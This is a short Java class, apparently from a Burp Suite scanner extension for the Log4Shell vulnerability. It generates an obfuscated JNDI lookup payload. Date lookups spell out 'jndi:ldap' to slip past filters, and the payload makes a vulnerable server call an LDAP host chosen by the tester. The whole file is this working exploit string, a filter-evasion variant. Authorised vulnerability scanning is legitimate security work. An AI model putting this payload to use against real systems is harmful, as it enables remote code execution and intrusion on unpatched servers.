package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC12 implements IPOC {

    @Override
    public String generate(String domain) {
        return "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }
}